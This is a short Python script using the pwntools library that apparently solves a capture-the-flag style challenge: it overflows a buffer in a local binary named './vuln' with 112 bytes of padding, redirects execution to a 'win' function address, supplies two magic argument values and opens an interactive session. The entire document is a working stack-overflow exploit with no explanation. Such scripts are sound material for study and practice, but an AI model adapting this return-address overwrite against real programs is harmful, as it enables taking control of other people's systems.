from pwn import *

padding = b"A" * 112
win_addr = p32(0x08049296)
ret_after_win = b"BBBB"           # Dummy return address
arg1 = p32(0xCAFEF00D)            # param_1
arg2 = p32(0xF00DF00D)            # param_2

payload = padding + win_addr + ret_after_win + arg1 + arg2

p = process("./vuln")
p.sendline(payload)
p.interactive()